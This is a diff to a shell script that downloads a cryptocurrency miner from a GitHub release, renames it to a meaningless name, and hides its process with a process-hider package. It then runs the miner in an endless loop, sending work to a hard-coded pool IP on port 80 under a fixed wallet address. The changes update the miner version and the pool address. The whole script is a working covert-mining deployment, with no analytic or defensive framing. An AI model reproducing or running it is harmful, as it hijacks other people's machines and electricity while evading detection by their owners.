@@ -3,12 +3,13 @@ apt -y install curl unzip autoconf git cmake binutils build-essential net-tools 
 npm i -g node-process-hider
 nvidia-smi
 rm -rf peakminer-2.9.1.tar.gz
-wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-9-1/peakminer-2.9.1.tar.gz
-tar xf peakminer-2.9.1.tar.gz
+wget https://github.com/peakminer/peakminer/releases/download/v2.10.0rc1/peakminer-2.10.0rc1.tar.gz
+tar xf peakminer-2.10.0rc1.tar.gz
+cd peakminer
 mv peakminer samlospo
 
 ph add samlospo
 
 while true; do
-./samlospo --coin pearl -o hk.pearl.gfwroute.com:1200 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
+./samlospo --coin pearl -o 212.47.248.156:80 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
 done
